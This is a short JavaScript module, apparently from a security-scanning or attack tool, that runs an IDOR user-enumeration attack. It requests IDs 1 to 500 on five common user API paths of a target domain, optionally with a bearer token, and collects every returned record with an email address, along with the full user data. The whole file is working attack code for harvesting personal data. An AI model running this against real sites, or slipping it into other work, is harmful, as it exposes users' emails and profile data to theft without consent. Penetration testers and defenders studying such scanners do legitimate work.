const axios = require('axios');
const logger = require('../utils/logger');

async function enumerateUsers(domain, authToken = null) {
  logger.info(`ðŸ”´ Starting user ID enumeration on ${domain}`);

  const result = {
    emails: [],
    data: [],
    vulnerabilities: [],
    usersFound: 0
  };

  const endpoints = [
    '/api/users',
    '/api/user',
    '/api/profiles',
    '/api/members',
    '/api/accounts'
  ];

  for (const baseEndpoint of endpoints) {
    logger.info(`   Enumerating: ${baseEndpoint}`);

    for (let id = 1; id <= 500; id++) {
      try {
        const url = `https://${domain}${baseEndpoint}/${id}`;

        const config = {
          timeout: 2000,
          validateStatus: () => true
        };

        if (authToken) {
          config.headers = { Authorization: `Bearer ${authToken}` };
        }

        const response = await axios.get(url, config);

        if (response.status === 200 && response.data && response.data.email) {
          result.emails.push(response.data.email);
          result.data.push(response.data);
          result.usersFound++;

          if (result.usersFound % 50 === 0) {
            logger.info(`   Found ${result.usersFound} users... `);
          }

          if (result.usersFound === 1) {
            result.vulnerabilities.push({
              type: 'User ID Enumeration (IDOR)',
              severity: 'HIGH',
              endpoint: baseEndpoint,
              method: 'Sequential ID access',
              firstId: id
            });
          }
        }
      } catch (error) {
        // User not found, continue
      }
    }

    if (result.usersFound > 100) break;
  }

  return result;
}

module.exports = { enumerateUsers };
